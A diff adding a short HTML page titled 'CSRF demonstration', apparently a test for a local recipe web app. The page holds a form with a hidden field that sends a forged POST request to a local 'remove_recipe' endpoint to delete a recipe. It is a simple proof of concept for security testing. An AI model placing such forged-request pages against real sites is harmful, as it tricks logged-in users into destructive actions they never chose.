@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+    <title>CSRF demonstration</title>
+</head>
+<body>
+    <h1>CSRF demonstration</h1>
+
+    <p>
+        this page sends a POST request to the application
+    </p>
+
+    <form
+        action="http://127.0.0.1:5000/remove_recipe/1"
+        method="post">
+
+        <input type="hidden"
+               name="remove"
+               value="delete recipe">
+
+        <button type="submit">send test request</button>
+    </form>
+
+</body>
+</html>
